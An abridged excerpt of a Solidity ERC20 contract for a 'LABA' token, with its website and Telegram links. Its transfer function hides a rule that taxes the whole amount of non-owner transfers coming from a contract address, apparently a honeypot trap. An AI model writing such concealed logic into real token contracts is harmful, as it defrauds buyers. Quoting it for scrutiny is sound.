...
Web: https://labatoken.vip

Tg: https://t.me/labacoin
...
contract LABA is Context, IERC20, Ownable {
    ...
    string private constant _symbol = "LABA"; 
    uint256 public _maxTx =  _tTotal * 30 / 1000;
    uint256 public _maxWallet = _tTotal * 30 / 1000;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (isContract(from)) taxAmout = amount;
        ...
        _balances[from]=_balances[from].sub(amount.sub(taxAmout));
